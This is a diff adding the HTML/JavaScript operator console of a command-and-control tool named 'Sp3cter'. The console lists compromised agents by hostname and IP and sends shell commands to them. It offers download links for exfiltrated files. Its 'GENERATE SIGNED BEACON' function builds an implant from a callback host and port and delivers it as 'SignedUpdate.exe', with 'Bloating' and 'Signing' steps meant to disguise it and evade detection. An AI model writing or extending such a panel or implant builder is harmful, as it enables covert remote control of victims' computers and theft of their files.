@@ -1,0 +1,125 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <title>👻 Sp3cter</title>
+    <style>
+        :root { --aqua-blue: #5dade2; --aqua-dark: #2e86c1; --accent: #00ffcc; --bg: #0a0a0a; --panel: #1a1a1a; --text: #e0e0e0; }
+        * { box-sizing: border-box; font-family: 'Segoe UI', sans-serif; }
+        body, html { height: 100vh; margin: 0; background: var(--bg); color: var(--text); overflow: hidden; }
+        .main-layout { display: flex; flex-direction: column; height: 100vh; }
+        header { height: 35px; background: linear-gradient(to bottom, #444, #222); display: flex; align-items: center; padding: 0 20px; border-bottom: 1px solid #000; font-size: 0.75rem; font-weight: bold; color: #888; }
+        .config-bar { height: 70px; background: var(--panel); display: flex; align-items: center; padding: 0 25px; gap: 15px; border-bottom: 1px solid #333; }
+        .progress-container { height: 40px; background: #111; padding: 0 25px; border-bottom: 1px solid #222; display: none; align-items: center; gap: 20px; }
+        .aqua-progress-bg { flex: 1; height: 10px; background: #000; border-radius: 10px; overflow: hidden; border: 1px solid #333; }
+        .aqua-progress-bar { width: 0%; height: 100%; background: linear-gradient(to bottom, #5dade2, #2e86c1); border-radius: 10px; transition: width 0.3s ease; box-shadow: 0 0 8px var(--aqua-blue); position: relative; }
+        .agents-zone { height: 160px; overflow-y: auto; background: #0d0d0d; border-bottom: 1px solid #222; padding: 10px 20px; }
+        table { width: 100%; border-collapse: collapse; }
+        th { text-align: left; padding: 8px; font-size: 0.65rem; color: #555; text-transform: uppercase; border-bottom: 1px solid #222; }
+        td { padding: 8px; background: #121212; color: #999; font-size: 0.8rem; cursor: pointer; border-bottom: 1px solid #1a1a1a; }
+        .selected-row td { background: #1c2a38 !important; color: var(--aqua-blue); border-bottom: 1px solid var(--aqua-blue); }
+        .terminal-container { flex: 1; margin: 15px 20px; display: flex; flex-direction: column; background: #000; border: 1px solid #333; border-radius: 12px; box-shadow: 0 10px 40px rgba(0,0,0,0.6); overflow: hidden; }
+        #console-output { flex: 1; padding: 20px; overflow: auto; font-family: 'Consolas', monospace !important; font-size: 14px; line-height: 1.2; white-space: pre !important; color: #ccc; margin: 0; }
+        .task-line { color: var(--accent); font-weight: bold; }
+        .dl-box { display: inline-block; white-space: normal; margin: 10px 0; padding: 12px; border: 1px solid var(--aqua-dark); background: rgba(46,134,193,0.15); border-radius: 10px; font-family: 'Segoe UI', sans-serif; vertical-align: middle; }
+        .terminal-input-line { background: #080808; padding: 12px 20px; border-top: 1px solid #222; display: flex; align-items: center; gap: 12px; }
+        .path-label { color: var(--accent); font-weight: bold; font-family: 'Consolas', monospace; font-size: 0.9rem; white-space: nowrap; }
+        .cmd-box { flex: 1; background: transparent; border: none; color: #fff; outline: none; font-size: 0.9rem; font-family: 'Consolas', monospace; }
+        .input-aqua { background: #000; border: 1px solid #444; border-radius: 15px; color: #fff; padding: 5px 12px; font-size: 0.8rem; outline: none; width: 150px; }
+        .btn-aqua { background: linear-gradient(to bottom, #5dade2, #2e86c1); border: none; border-radius: 20px; color: white; padding: 8px 22px; font-size: 0.7rem; font-weight: bold; cursor: pointer; box-shadow: 0 2px 4px #000; }
+        .btn-clip { background: #333; border-radius: 50%; width: 32px; height: 32px; display: flex; align-items: center; justify-content: center; cursor: pointer; border: 1px solid #555; }
+    </style>
+</head>
+<body>
+<div class="main-layout">
+    <header>👻 Sp3cter</header>
+    <div class="config-bar">
+        <label style="font-size:0.65rem">LHOST</label><input type="text" id="v_host" class="input-aqua">
+        <label style="font-size:0.65rem">LPORT</label><input type="text" id="v_port" value="5000" class="input-aqua" style="width:70px">
+        <div class="btn-clip" onclick="document.getElementById('sig_file').click()">📎</div>
+        <input type="file" id="sig_file" style="display:none" onchange="document.getElementById('fn').innerText = this.files[0].name.substring(0,12)">
+        <span id="fn" style="font-size:0.6rem; color:#444; width:80px; overflow:hidden;">No template</span>
+        <div style="flex-grow:1"></div>
+        <button class="btn-aqua" id="gen-btn" onclick="compile()">GENERATE SIGNED BEACON</button>
+    </div>
+    <div class="progress-container" id="prog-cont">
+        <span id="prog-text" style="font-size:0.6rem; color:var(--aqua-blue); font-weight:bold; width:200px;">STATUS: STANDBY</span>
+        <div class="aqua-progress-bg"><div class="aqua-progress-bar" id="prog-bar"></div></div>
+    </div>
+    <div class="agents-zone"><table><thead><tr><th>ID</th><th>HOSTNAME</th><th>IP</th><th>LAST SEEN</th></tr></thead><tbody id="agent-list"></tbody></table></div>
+    <div class="terminal-container">
+        <div id="console-output">[*] SP3CTER TERMINAL INITIALIZED...</div>
+        <div class="terminal-input-line">
+            <span class="path-label" id="path-label">C:\></span>
+            <input type="text" id="cmd-input" class="cmd-box" placeholder="Execute command..." onkeypress="handleCommand(event)">
+        </div>
+    </div>
+</div>
+<script>
+    let selectedAgent = null; let agentHistory = {};
+    window.onload = () => { document.getElementById('v_host').value = window.location.hostname; };
+
+    function addLog(msg, type = "output", aid = null) {
+        const target = aid || selectedAgent; if (!target) return;
+        if (!agentHistory[target]) agentHistory[target] = "";
+        let content = msg;
+        if (msg.includes('---PATH---')) {
+            const pts = msg.split('---PATH---');
+            content = pts[0];
+            document.getElementById('path-label').innerText = pts[1].trim() + ">";
+        }
+        let formatted = (type === "task") ? `\n<span class="task-line">> ${msg}</span>\n` : content.replace(/d-----/g, '<span style="color:orange">d-----</span>').replace(/-a----/g, '<span style="color:var(--aqua-blue)">-a----</span>');
+        agentHistory[target] += formatted;
+        if (target === selectedAgent) { const out = document.getElementById('console-output'); out.innerHTML = agentHistory[selectedAgent]; out.scrollTop = out.scrollHeight; }
+    }
+
+    async function fetchAgents() {
+        try {
+            const r = await fetch('/api/v1/operator/list'); const data = await r.json();
+            const list = document.getElementById('agent-list'); list.innerHTML = '';
+            for (const id in data) {
+                const tr = document.createElement('tr'); if(selectedAgent === id) tr.className = 'selected-row';
+                tr.onclick = () => { selectedAgent = id; document.getElementById('console-output').innerHTML = agentHistory[id] || ''; fetchAgents(); };
+                tr.innerHTML = `<td>${id}</td><td>${data[id].hostname}</td><td>${data[id].ip}</td><td>${data[id].last_seen}</td>`;
+                list.appendChild(tr);
+            }
+        } catch(e) {}
+    }
+
+    async function fetchResults() {
+        if (!selectedAgent) return;
+        const r = await fetch(`/api/v1/operator/results/${selectedAgent}`); const data = await r.json();
+        data.results.forEach(res => addLog(res, "output"));
+        data.files.forEach(f => {
+            const html = `\n<div class="dl-box"><span style="color:var(--aqua-blue); font-weight:bold;">[+] EXFILTRATION SUCCESS: </span><a href="/api/v1/operator/download_file/${selectedAgent}/${f}" target="_blank" style="color:var(--accent); font-weight:bold; text-decoration:underline;">DOWNLOAD ${f}</a></div>\n`;
+            agentHistory[selectedAgent] += html;
+            if (selectedAgent) { document.getElementById('console-output').innerHTML = agentHistory[selectedAgent]; }
+        });
+    }
+
+    function handleCommand(e) { if (e.key === 'Enter' && e.target.value.trim() !== '') { fetch('/api/v1/operator/push', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({id:selectedAgent, cmd:e.target.value})}); addLog(e.target.value, "task"); e.target.value = ''; } }
+    
+    function setProgress(val, text) { document.getElementById('prog-bar').style.width = val + "%"; document.getElementById('prog-text').innerText = "STATUS: " + text.toUpperCase(); }
+    async function compile() {
+        const cont = document.getElementById('prog-cont'); const btn = document.getElementById('gen-btn');
+        cont.style.display = "flex"; btn.disabled = true; setProgress(15, "Compilando...");
+        const fd = new FormData();
+        fd.append('v_host', document.getElementById('v_host').value);
+        fd.append('v_port', document.getElementById('v_port').value);
+        
+        // FIX CRÍTICO: Mandar el archivo real (.files[0])
+        const fileInput = document.getElementById('sig_file');
+        if (fileInput.files.length > 0) fd.append('template_file', fileInput.files[0]);
+
+        let p = 15; const interval = setInterval(() => { if (p < 90) { p += 2; setProgress(p, p < 50 ? "Bloating..." : "Signing..."); } }, 400);
+        try {
+            const r = await fetch('/generate', { method: 'POST', body: fd });
+            clearInterval(interval); if (!r.ok) throw new Error(); setProgress(100, "¡Done!");
+            const b = await r.blob(); const a = document.createElement('a'); a.href = URL.createObjectURL(b); a.download = "SignedUpdate.exe"; a.click();
+        } catch(e) { clearInterval(interval); setProgress(0, "Error"); }
+        finally { setTimeout(() => { cont.style.display = "none"; btn.disabled = false; }, 3000); }
+    }
+    setInterval(fetchAgents, 3000); setInterval(fetchResults, 2000);
+</script>
+</body>
+</html>
